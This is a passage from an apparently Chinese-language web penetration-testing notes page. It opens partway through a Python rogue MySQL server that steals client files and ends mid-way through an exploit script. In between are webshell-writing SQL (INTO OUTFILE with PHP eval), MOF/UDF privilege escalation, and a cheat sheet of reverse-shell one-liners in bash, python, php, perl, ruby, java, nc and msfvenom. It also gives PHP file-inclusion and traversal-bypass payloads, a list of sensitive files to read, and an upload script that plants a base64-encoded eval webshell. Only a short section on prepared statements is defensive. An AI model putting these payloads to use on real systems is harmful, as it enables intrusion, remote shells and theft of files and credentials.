self.state == &apos;LEN&apos;:</span><br><span class="line">            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1</span><br><span class="line">            if len_bytes &lt; 65536:</span><br><span class="line">                self.set_terminator(len_bytes)</span><br><span class="line">                self.state = &apos;Data&apos;</span><br><span class="line">            else:</span><br><span class="line">                self.state = &apos;MoreLength&apos;</span><br><span class="line">        elif self.state == &apos;MoreLength&apos;:</span><br><span class="line">            if data[0] != &apos;\0&apos;:</span><br><span class="line">                self.push(None)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">            else:</span><br><span class="line">                self.state = &apos;Data&apos;</span><br><span class="line">        elif self.state == &apos;Data&apos;:</span><br><span class="line">            packet = mysql_packet.parse(data)</span><br><span class="line">            try:</span><br><span class="line">                if self.order != packet.packet_num:</span><br><span class="line">                    raise OutOfOrder()</span><br><span class="line">                else:</span><br><span class="line">                    # Fix ?</span><br><span class="line">                    self.order = packet.packet_num + 2</span><br><span class="line">                if packet.packet_num == 0:</span><br><span class="line">                    if packet.payload[0] == &apos;\x03&apos;:</span><br><span class="line">                        log.info(&apos;Query&apos;)</span><br><span class="line"></span><br><span class="line">                        filename = random.choice(filelist)</span><br><span class="line">                        PACKET = mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            &apos;\xFB&#123;0&#125;&apos;.format(filename)</span><br><span class="line">                        )</span><br><span class="line">                        self.set_terminator(3)</span><br><span class="line">                        self.state = &apos;LEN&apos;</span><br><span class="line">                        self.sub_state = &apos;File&apos;</span><br><span class="line">                        self.push(PACKET)</span><br><span class="line">                    elif packet.payload[0] == &apos;\x1b&apos;:</span><br><span class="line">                        log.info(&apos;SelectDB&apos;)</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet,</span><br><span class="line">                            &apos;\xfe\x00\x00\x02\x00&apos;</span><br><span class="line">                        ))</span><br><span class="line">                        raise LastPacket()</span><br><span class="line">                    elif packet.payload[0] in &apos;\x02&apos;:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, &apos;\0\0\0\x02\0\0\0&apos;</span><br><span class="line">                        ))</span><br><span class="line">                        raise LastPacket()</span><br><span class="line">                    elif packet.payload == &apos;\x00\x01&apos;:</span><br><span class="line">                        self.push(None)</span><br><span class="line">                        self.close_when_done()</span><br><span class="line">                    else:</span><br><span class="line">                        raise ValueError()</span><br><span class="line">                else:</span><br><span class="line">                    if self.sub_state == &apos;File&apos;:</span><br><span class="line">                        log.info(&apos;-- result&apos;)</span><br><span class="line">                        log.info(&apos;Result: %r&apos;, data)</span><br><span class="line"></span><br><span class="line">                        if len(data) == 1:</span><br><span class="line">                            self.push(</span><br><span class="line">                                mysql_packet(packet, &apos;\0\0\0\x02\0\0\0&apos;)</span><br><span class="line">                            )</span><br><span class="line">                            raise LastPacket()</span><br><span class="line">                        else:</span><br><span class="line">                            self.set_terminator(3)</span><br><span class="line">                            self.state = &apos;LEN&apos;</span><br><span class="line">                            self.order = packet.packet_num + 1</span><br><span class="line"></span><br><span class="line">                    elif self.sub_state == &apos;Auth&apos;:</span><br><span class="line">                        self.push(mysql_packet(</span><br><span class="line">                            packet, &apos;\0\0\0\x02\0\0\0&apos;</span><br><span class="line">                        ))</span><br><span class="line">                        raise LastPacket()</span><br><span class="line">                    else:</span><br><span class="line">                        log.info(&apos;-- else&apos;)</span><br><span class="line">                        raise ValueError(&apos;Unknown packet&apos;)</span><br><span class="line">            except LastPacket:</span><br><span class="line">                log.info(&apos;Last packet&apos;)</span><br><span class="line">                self.state = &apos;LEN&apos;</span><br><span class="line">                self.sub_state = None</span><br><span class="line">                self.order = 0</span><br><span class="line">                self.set_terminator(3)</span><br><span class="line">            except OutOfOrder:</span><br><span class="line">                log.warning(&apos;Out of order&apos;)</span><br><span class="line">                self.push(None)</span><br><span class="line">                self.close_when_done()</span><br><span class="line">        else:</span><br><span class="line">            log.error(&apos;Unknown state&apos;)</span><br><span class="line">            self.push(&apos;None&apos;)</span><br><span class="line">            self.close_when_done()</span><br><span class="line">class mysql_listener(asyncore.dispatcher):</span><br><span class="line">    def __init__(self, sock=None):</span><br><span class="line">        asyncore.dispatcher.__init__(self, sock)</span><br><span class="line"></span><br><span class="line">        if not sock:</span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            self.set_reuse_addr()</span><br><span class="line">            try:</span><br><span class="line">                self.bind((&apos;&apos;, PORT))</span><br><span class="line">            except socket.error:</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            self.listen(5)</span><br><span class="line"></span><br><span class="line">    def handle_accept(self):</span><br><span class="line">        pair = self.accept()</span><br><span class="line"></span><br><span class="line">        if pair is not None:</span><br><span class="line">            log.info(&apos;Conn from: %r&apos;, pair[1])</span><br><span class="line">            tmp = http_request_handler(pair)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z = mysql_listener()</span><br><span class="line"># daemonize()</span><br><span class="line">asyncore.loop()</span><br></pre></td></tr></table></figure>

<h4 id="mysql-5-7-新特性"><a href="#mysql-5-7-新特性" class="headerlink" title="mysql 5.7 新特性"></a>mysql 5.7 新特性</h4><p> 在MySQL 5.7中，有不少安全性相关的改进：创建账号分2步：用create user来建立账号（账号长度加大），用grant 来授权；初始数据库的时候密码不为空；账号可以锁和可以设置密码过期；test库被删除；默认提供ssl连接；sql_mode增强等。 </p>
<p>链接： <a href="https://www.cnblogs.com/zhoujinyi/p/5627494.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhoujinyi/p/5627494.html</a> </p>
<p> MySQL 5.7.6 中删除了<code>mysql.user</code> system table 的<code>Password</code>列。所有凭据都存储在<code>authentication_string</code>列中，包括以前存储在<code>Password</code>列中的凭据。 </p>
<p>新增了报错函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ST_LatFromGeoHash(concat(0x7e,(select database()),0x7e))</span><br></pre></td></tr></table></figure>

<h4 id="写文件-getshell"><a href="#写文件-getshell" class="headerlink" title="写文件 getshell"></a>写文件 getshell</h4><p>利用需要满足以下条件:</p>
<ul>
<li>对web目录有写权限</li>
<li>GPC关闭（能使用单引号）</li>
<li>有绝对路径（读文件可以不用，写文件必须）</li>
<li>没有配置 –secure-file-priv</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &apos;一句话&apos; into outfile &apos;路径&apos;</span><br><span class="line">select &apos;一句话&apos; into dumpfile &apos;路径&apos;</span><br><span class="line">select &apos;&lt;?php eval($_POST[1]) ?&gt;&apos; into dumpfile  &apos;d:\\wwwroot\baidu.com\nvhack.php&apos;;</span><br></pre></td></tr></table></figure>

<h4 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h4><p>MOF提权</p>
<p> MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。 </p>
<p> MOF文件既然每五秒就会执行，而且是系统权限，我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。 </p>
<p>利用条件</p>
<ul>
<li>Windows&lt;=2003</li>
<li>mysql在c:windows/system32/mof目录有写权限</li>
<li>已知数据库账号密码</li>
</ul>
<p>UDF提权</p>
<p> UDF,user defined funcion,即用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。 </p>
<p> 当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权 </p>
<p>利用条件</p>
<ul>
<li>windows2003、windowsXP、windows7</li>
<li>拥有mysql的insert和delete权限</li>
</ul>
<p>参考链接： <a href="https://www.cnblogs.com/litlife/p/9030673.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/9030673.html</a> </p>
<p>CVE-2016-6663</p>
<p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p>
<p>CVE-2016-6664</p>
<p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。</p>
<p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。</p>
<h3 id="php-防止sql注入"><a href="#php-防止sql注入" class="headerlink" title="php 防止sql注入"></a>php 防止sql注入</h3><h4 id="魔术引用"><a href="#魔术引用" class="headerlink" title="魔术引用"></a>魔术引用</h4><p> addslashes() 用于对变量中的’ “ 和NULL添加斜杠，用于避免传入sql语句的参数格式错误 </p>
<h4 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a><strong>mysql_real_escape_string()</strong></h4><p> 此函数在使用时会使用于数据库连接(因为要检测字符集)，并根据不同的字符集做不同的操作。如果当前连接不存在，刚会使用上一次的连接。 </p>
<p> 此方法在php5.5后不被建议使用，在php7中废除。 </p>
<h4 id="预处理查询-Prepared-Statements"><a href="#预处理查询-Prepared-Statements" class="headerlink" title="预处理查询 (Prepared Statements)"></a><strong>预处理查询 (Prepared Statements)</strong></h4><p> 在传统的写法中，sql查询语句在程序中拼接，防注入(加斜杠)是在php中处理的，然后就发语句发送到mysql中，mysql其实没有太好的办法对传进来的语句判断哪些是正常的，哪些是恶意的，所以直接查询的方法都有被注入的风险。<br>在mysql5.1后，提供了类似于jdbc的预处理-参数化查询。它的查询方法是：<br>a. 先预发送一个sql模板过去<br>b. 再向mysql发送需要查询的参数<br>就好像填空题一样，不管参数怎么注入，mysql都能知道这是变量，不会做语义解析，起到防注入的效果，这是在mysql中完成的 </p>
<p>两种实现方式</p>
<p> mysqli:prepare() </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$mysqli = new mysqli(&quot;example.com&quot;, &quot;user&quot;, &quot;password&quot;, &quot;database&quot;);</span><br><span class="line">$stmt = $mysqli-&gt;prepare(&quot;SELECT id, label FROM test WHERE id = ?&quot;);</span><br><span class="line">$stmt-&gt;bind_param(1, $city);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$res = $stmt-&gt;get_result();</span><br><span class="line">$row = $res-&gt;fetch_assoc();</span><br></pre></td></tr></table></figure>

<p>pdo实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$pdo = new PDO(&quot;mysql:host=localhost;dbname=test;charset=utf8&quot;,&apos;root&apos;,&apos;pwd&apos;);</span><br><span class="line">$pdo-&gt;exec(&apos;set names utf8&apos;);</span><br><span class="line">$id = &apos;0 or 1 =1 order by id desc&apos;;</span><br><span class="line">$sql = &quot;select * from article where id = ?&quot;;</span><br><span class="line">$statement = $pdo-&gt;prepare($sql);</span><br><span class="line">$statement-&gt;bindParam(1, $id);</span><br><span class="line">$statement-&gt;execute();</span><br></pre></td></tr></table></figure>

<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><blockquote>
<p>bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1</p>
</blockquote>
<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><blockquote>
<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“ip”,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
</blockquote>
<p>弹计算器：eval(“__import__(‘os’).system(‘calc.exe’)”)</p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><blockquote>
<p>php -r ‘$sock=fsockopen(“ip”,port);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
</blockquote>
<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><blockquote>
<p>r = Runtime.getRuntime()<br>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[])<br>p.waitFor()</p>
</blockquote>
<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><blockquote>
<p>perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
</blockquote>
<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><blockquote>
<p>ruby -rsocket -e’f=TCPSocket.open(“ip”,port).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</p>
</blockquote>
<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><blockquote>
<p>nc -e /bin/sh ip port</p>
</blockquote>
<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>查询信息</p>
<blockquote>
<p>msfvenom -l payloads ‘cmd/unix/reverse’</p>
</blockquote>
<p>选择payload</p>
<blockquote>
<p>msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R</p>
</blockquote>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用条件：与文件包含的函数有四个</p>
<ul>
<li>include()</li>
<li>include_once()</li>
<li>require()</li>
<li>require_once()</li>
</ul>
<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析</p>
<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>本地文件包含漏洞</p>
<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>远程文件包含漏洞，利用环境比较严格，需要在php.ini中设置</p>
<ul>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ul>
<h3 id="常见敏感文件"><a href="#常见敏感文件" class="headerlink" title="常见敏感文件"></a>常见敏感文件</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul>
<li>c:\boot.ini</li>
<li>c:\windows\systems32\inetsrv\MetaBase.xml</li>
<li>c:\windows\repair\sam</li>
<li>c:\windows\php.ini             php配置文件</li>
<li>c:\windows\my.ini               mysql配置文件</li>
</ul>
<h4 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h4><h5 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h5><ul>
<li>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</li>
<li>WEB-INF/database.properties : 数据库配置文件</li>
<li>WEB-INF/classes/ : 一般用来存放Java类文件(.class)</li>
<li>WEB-INF/lib/ : 用来存放打包好的库(.jar)</li>
<li>WEB-INF/src/ : 用来放源代码(.asp和.php等)</li>
<li>tomcat[默认端口8080 需要用户名密码,还是那句话多尝试些弱口令,进去以后上传war马]</li>
<li>jboss [默认端口8080无需任何验证,进去以后上传war马]</li>
<li>weblogic [默认端口7001,实际很多是在8080上,进去以后上传war马]</li>
<li>Websphere[默认端口9043,实际很多是在8080上,进去以后上传war马]</li>
<li>webmin[web版的服务器管理工具,默认端口10000,可以把它当做图形版的ssh管理工具]</li>
</ul>
<h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><ul>
<li>/etc/passwd</li>
<li>/usr/local/app/apache2/conf/http.conf</li>
<li>/usr/local/app/php5/lib/php.ini          PHP相关设置</li>
<li>/etc/httpd/conf/httpd.conf                    apache配置文件</li>
<li>/etc/my.cnf     </li>
<li>/etc/nginx/nginx.conf                            nginx配置文件</li>
<li>/var/www/html/wp-config.php           wordpress配置文件</li>
<li>/usr/local/nginx/conf/nginx.conf         nginx配置文件</li>
<li>/etc/apache2/sites-available/000-default.conf </li>
</ul>
<h3 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h3><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>利用条件：</p>
<ul>
<li>allow_url_include = On。</li>
<li>对allow_url_fopen不做要求。</li>
</ul>
<blockquote>
<p>?file=php://input<br>POST:<br><? phpinfo();?></p>
</blockquote>
<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><blockquote>
<p>?file=php://filter/read=convert.base64-encode/resource=index.php</p>
</blockquote>
<blockquote>
<p>?file=php://filter/convert.base64-encode/resource=index.php</p>
</blockquote>
<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.3.0</li>
</ul>
<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，命名为test.zip</p>
<p>然后去包含</p>
<blockquote>
<p>?file=phar://test.zip/phpinfo.txt</p>
</blockquote>
<h5 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.3.0</li>
</ul>
<p>利用同phar，但是需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code></p>
<blockquote>
<p>?file=zip:///var/www/html/test.zip%23phpinfo.txt</p>
</blockquote>
<h5 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ul>
<blockquote>
<p>?file=data:text/plain,<?php phpinfo();?></p>
<p>?file=data:text/plain,<?php system('whoami');?></p>
<p>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</p>
<p>?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</p>
</blockquote>
<h4 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h4><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>常见的php-session存放位置：</p>
<ul>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ul>
<h4 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h4><h5 id="服务器日志"><a href="#服务器日志" class="headerlink" title="服务器日志"></a>服务器日志</h5><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读</p>
<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/</p>
<h5 id="ssh日志"><a href="#ssh日志" class="headerlink" title="ssh日志"></a>ssh日志</h5><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<blockquote>
<p>$ ssh ‘<?php phpinfo(); ?>‘@remotehost</p>
</blockquote>
<p>然后进行文件包含即可</p>
<h4 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h4><p>利用条件：</p>
<ul>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ul>
<p>利用姿势：proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h4><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
<ul>
<li>利用url编码<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/</li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
</li>
<li>二次编码<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
</li>
<li>容器/服务器的编码方式<ul>
<li>../<ul>
<li>..%c0%af<ul>
<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></li>
</ul>
</li>
<li>%c0%ae%c0%ae/<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
<li>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li>..\<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h4><p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
<h5 id="姿势一：query-？"><a href="#姿势一：query-？" class="headerlink" title="姿势一：query ？"></a>姿势一：query ？</h5><blockquote>
<p>?file=<a href="http://remoteaddr/remoteinfo.txt" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt</a>?</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># remoteinfo.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="姿势二：fragment"><a href="#姿势二：fragment" class="headerlink" title="姿势二：fragment"></a>姿势二：fragment</h5><blockquote>
<p>?file=<a href="http://remoteaddr/remoteinfo.txt%23" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt%23</a></p>
</blockquote>
<h5 id="姿势三：长度截断"><a href="#姿势三：长度截断" class="headerlink" title="姿势三：长度截断"></a>姿势三：长度截断</h5><p>利用条件： php版本 &lt; php 5.2.8</p>
<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
<h5 id="姿势四：0字节截断"><a href="#姿势四：0字节截断" class="headerlink" title="姿势四：0字节截断"></a>姿势四：0字节截断</h5><p>利用条件： php版本 &lt; php 5.3.4</p>
<blockquote>
<p>?file=phpinfo.txt%00</p>
</blockquote>
<h4 id="strops-绕过"><a href="#strops-绕过" class="headerlink" title="strops 绕过"></a>strops 绕过</h4><blockquote>
<p>?file=php://filter/string.strip_tags/resource=/etc/passwd</p>
</blockquote>
<p>将<code>php://filter/string.strip_tags/resource=/etc/passwd</code>这个 payload 传入<code>include</code>方法会让 php 产生一个 segmentfault ，然后在这段时间内上传的文件将会存储在 php.ini 指定的 <code>upload_tmp_dir</code> 文件夹下，并且不会被删除</p>
<h4 id="php-lt-7-2-段错误-包含临时文件"><a href="#php-lt-7-2-段错误-包含临时文件" class="headerlink" title="php&lt;7.2 段错误 包含临时文件"></a>php&lt;7.2 段错误 包含临时文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.43.155"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">"http://%s:%d"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span><span class="params">(url, file_content)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'file'</span>: (<span class="string">'evil.jpg'</span>, file_content, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, files=files)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span><span class="params">()</span>:</span></span><br><span class="line">    webshell_content = <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>.encode(</span><br><span class="line">        <span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip().encode(<span class="string">"base64"</span>).strip()</span><br><span class="line">    file_content = <span class="string">'&lt;?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s")))&#123;echo "flag";&#125;?&gt;'</span> % (</span><br><span class="line">        webshell_content)</span><br><span class="line">    phpinfo_url = <span class="string">"%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd"</span> % (</span><br><span class="line">        base_url)</span><br><span class="line">    length = <span class="number">6</span></span><br><span class="line">    times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] %d / %d"</span> % (i, times)</span><br><span class="line">        upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    generate_tmp_files()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>爆破得到文件名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.43.155"</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">"http://%s:%d"</span> % (host, port)</span><br><span class="line"></span><br><span class="line"></span><br><span 